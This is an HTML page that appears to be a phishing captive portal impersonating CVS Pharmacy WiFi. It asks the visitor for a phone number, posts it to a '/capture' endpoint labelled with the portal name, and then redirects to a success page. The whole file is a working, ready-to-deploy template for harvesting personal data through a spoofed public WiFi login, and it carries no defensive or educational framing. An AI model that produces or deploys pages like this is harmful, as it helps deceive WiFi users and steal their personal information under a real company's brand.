<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>CVS WiFi</title><style>*{margin:0;padding:0}body{font-family:Arial;background:linear-gradient(135deg,#CC0000,#ED1C24);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}.container{background:white;border-radius:10px;max-width:400px;width:100%;padding:40px 30px}.logo h1{color:#CC0000;font-size:28px;text-align:center;margin-bottom:30px}.form-group{margin-bottom:20px}label{display:block;margin-bottom:8px;color:#555;font-weight:500}input{width:100%;padding:12px;border:2px solid #ddd;border-radius:5px}input:focus{outline:none;border-color:#CC0000}button{width:100%;padding:14px;background:#CC0000;color:white;border:none;border-radius:5px;font-weight:bold;cursor:pointer}</style></head><body><div class="container"><div class="logo"><h1>CVS PHARMACY</h1></div><form id="loginForm"><div class="form-group"><label>Phone Number</label><input type="tel" id="phone" required placeholder="(555) 123-4567"></div><button type="submit">Connect</button></form></div><script>document.getElementById('loginForm').addEventListener('submit',function(e){e.preventDefault();const phone=document.getElementById('phone').value;console.log('[CVS] Phone:',phone);fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({portal:'CVS',phone:phone})}).catch(err=>console.log(err));window.location.href='success.html';});</script></body></html>
